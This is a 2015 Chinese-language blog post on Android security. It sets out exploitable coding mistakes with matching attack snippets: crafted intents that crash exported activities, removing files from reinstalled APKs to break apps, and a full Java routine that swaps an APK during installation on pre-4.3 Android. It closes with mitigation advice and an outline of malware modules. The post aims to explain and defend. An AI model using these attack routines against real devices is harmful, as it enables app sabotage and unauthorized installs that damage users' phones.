---
layout: post
title: "Android安全浅析"
date: 2015-07-23 14:36:25 +0800
comments: true
categories: 
---



killBackgroundProcesses引起的事件

前一段时间，知乎上有一个非常热门的话题，就是“美团通过killBackgroundProcesses来杀死竞争对手APP”，
但是这个话题感觉炒作的成份更多点，或被一些有心人放大了来说，只有一定经验的Android开发，都知道
killBackgrooundProcesses这个方法并没有想像的那么强大，很多时候，并没有得到想要的效果，而且现在
的Android都会重新启动那些意外死亡的进程的，所以感觉这事情是被人放大了来炒作了。

如果真要通过杀死竞争对手的APP这种方式来竞争，根本不会用这样的方法了。有一些方法可以让一些APP根本
无法工作。

### 由于自身漏洞引发的无法工作漏洞

``` java 
Intent i = new Intent();
if (i.getAction().equals("TestForNullPointerException")) {
    Log.d("TAG", "Test for Android Refuse Service Bug");
}
```

上面的代码，应试很多人都会这样写，而且也写了不少，看起来没什么问题，但是这个却会引起一个攻击漏洞

``` java 
adb shell am start -n xxx.xxx.xxx/.MainActivity
```

遇到这样的攻击代码，可能就会导致APP崩溃，

而且当攻击者通过APP不停的进行攻击时，就会不停的提示崩溃，用户就极有可能会把那相APP卸载
这样就很可能达到“消灭对手”的目的

再例如下面的代码，就会被人利用来进行攻击

``` java 
Intent i = getIntent();
String test = (String)i.getSerializableExtra("serializable_key");
```

攻击代码（根据对应APP的Intent传递数据缺少校验来进行修改）

``` java 
Intent i = new Intent();
i.setClassName("xxx.xxxx.xxxxx", "xxx.xxxx.xxxxx.MainActivity");
i.putExtra("serializable_key", BigInteger.valueOf(1));
startActivity(i);
```

这个漏洞的情况非常常见，而且可利用的情况非常的多。例如：

``` java 
Intent intent = getIntent();
ArrayList<Integer> intArray = intent.getIntegerArrayListExtra("user_id");
if (intArray != null) {
    for (int i = 0; i < USER_NUM; i++) {
        intArray.get(i);
    }
}
```

这样的代码也是很容易就被利用到的

攻击代码：

``` java 
Intent intent = new Intent();
intent.setClassName("xxx.xxxx.xxxxx", "xxx.xxxx.xxxxx.MainActivity");

ArrayList<Integer> user_id = new ArrayList<Integer>();

intent.putExtra("user_id", user_id);
startActivity(intent);
```

会有这个漏洞还是因为校验数据合法性的问题，所以在使用传递过来的数据时，应该先做好数据校验，或者加
上try/catch代码块，以免由于疏忽引起的漏洞被有心人利用。


> 建议：不必要的组件设置为`android:exported="false"`，对数据做好正确性的校验，通过Intent传递的数据处理加上try/catch。


### Android自身漏洞引发的无法工作漏洞

Android开发者都知道，如果一个APP包名相同，签名不同，是不能覆盖安装的，这样可以防止别人把APP植入
代码后再重新打包来进行安装。

但是在Android的签名检验里面却有一个漏洞，就是，如果一个apk里面的文件少了，比如apk里面的dex文件少
了一个文件什么的，这样子的apk，Android的签名校验会认为这个apk没有被修改过。

这样子就会被人利用来让一些APP无法工作，严重的，把整台手机的APP都变成无法工作，让手机彻底变“砖头”

攻击的流程也很简单

在Android设备中，其apk存储路径主要集中在 /data/app (用户应用)，/system/app(系统预装应用)和
/system/priv-app(系统核心应用)，但这三个文件夹均提供了读权限给任意的用户，不需要root：

这样子，就可以从这些目录里面把手机里的APP读取出来，然后，再删除里面的一些文件，再覆盖安装回去
这样子，因为签名一样，包名一样，就是提示为升级或覆盖安装，一但安装，那样这个应用就将无法工作

在删除apk中的文件时，不能删除classes.dex、AndroidManifest.xml以及/META-INFO文件夹。


这个漏洞的危害是非常大的，特别是有root的手机，因为可以静默安装，所以防不胜防，没有root的还好，
因为还会提示应用的安装。


从上面的攻击漏洞可以看到，这个需要用户安装APP，那样子，用户就可以选择不安装就可以了。
虽然要通过覆盖安装再会生效，这样会比较麻烦，但是事情没有绝对了，有一种方法可以实现无root权限
来进行“伪静默安装”的

在Android4.3之前，甚至一部分4.3的手机，安装的apk的时候都会有一个漏洞，那就是会被安装的应用会被
替换掉

通常，安装一个应用会有以下几个流程

* 弹出权限的确认页面
* 用户点击确认之后，就开始进入安装流程，然后就安装成功

可以发现，在这两个步骤之间，是有一个时间间隔的，这样，就可以利用这个时间间隔，把原来要安装的
apk替换成别的apk，这样子就会让安装进去的apk拥有意想不到的权限，

会发生这个是因为Android4.3之前，并没有对apk文件进行再次的校验引起的。

攻击代码示例

``` java 
    protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		final ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
		
		new Thread(new Runnable()
		{
			private boolean isReplace = false;
			
			@SuppressLint("SdCardPath")
			@Override
			public void run()
			{
				while(true)
				{
					@SuppressWarnings("deprecation")
					List<RunningTaskInfo> taskInfos = am.getRunningTasks(1);
					RunningTaskInfo taskInfo = taskInfos.get(0);
					ComponentName activity = taskInfo.topActivity;
					Log.v("vcode", "----" + activity);
					if(activity.toString().contains("PackageInstallerActivity") && !isReplace)
					{
						try
						{
							File file = new File("/sdcard/aaa.apk");
							file.renameTo(new File("/sdcard/aaa_.apk"));
							File attackFile = new File("/sdcard/o.apk");
							attackFile.renameTo(new File("/sdcard/aaa.apk"));
							isReplace = true;
							Log.v("vcode", "---------------------" + isReplace);
						}
						catch (Exception e)
						{
							Log.v("vcode", "--", e);
							e.printStackTrace();
						}
					}
					
					try
					{
						Thread.sleep(3000);
					}
					catch (Exception e)
					{
						e.printStackTrace();
					}
				}
			}
		}).start();
	}
```

这个漏洞是非常强大的，可以实现免root的伪静默安装


除了上面说到的这些漏洞，其实还有很多的漏洞可以实行攻击的，系统级的漏洞我们可能不能做什么
但是如果是由于自己的疏忽引发的漏洞还是要做好的

* allowBackup
* 四大组件
* 动态加载
* 数据库，SharedPreferences

这些都是很容易出问题的地方

最后说一下Android的病毒木马

其实Android的病毒木马都是带有强烈的欺骗性的，都是通过模仿别的应用来达到欺骗的效果，
比如说伪造QQ的密码修改界面，让用户修改，然后就可以盗号了。很多都是这样一个形式

主要有下面的几大模块

* 一个和官方一样的界面
* 读取短信，发送短信，获取通信录的权限（发送短信给通讯录里面的人，传播）
* 注册设备管理器*(防止被卸载，隐藏图标等)
* 指令模块（短信指令，网络指令）


还有一些就是更暴力的，明抢的方式，就是通过锁屏类软件，让用户手机无法使用，如果想要使用，就汇钱
然后才能打开锁屏。
